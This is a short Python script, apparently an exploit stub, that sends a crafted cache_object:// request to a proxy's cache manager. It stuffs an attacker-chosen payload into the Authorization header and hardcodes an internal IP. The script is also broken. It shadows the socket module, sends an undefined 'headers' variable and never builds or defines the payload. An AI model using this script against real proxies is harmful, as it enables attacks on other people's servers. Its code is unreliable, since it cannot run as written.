#!/usr/bin/python3
import socket
import argparse

def send(headers, socket):
    headers_bytes = headers.encode('utf-8')
    total_sent=0
    while(total_sent < len(headers_bytes)):
        sent = socket.send(headers_bytes[total_sent:])
        if sent == 0:
            raise RuntimeError("socket connection broken.")
        total_sent += sent

def receive(socket):
    chunks = []
    while True:
        data = socket.recv(4096)
        chunks.append(data)
        if len(data) < 4096: break
    return chunks

def get_headers(payload):
    return 'GET cache_object://192.168.57.189/info HTTP/1.0\r\nHost: 192.168.57.189\r\nAuthorization: ' + payload

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="url of proxy.")
    parser.add_argument("-p", "--port", help="proxy port.", type=int)
    args = parser.parse_args()
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.connect((args.url, args.port))
    headers_bytes = headers.encode('utf-8')
    total_sent=0
    while(total_sent < len(headers_bytes)):
        sent = socket.send(headers_bytes[total_sent:])
        if sent == 0:
            raise RuntimeError("socket connection broken.")
        total_sent += sent



if __name__ == "__main__":
    main()
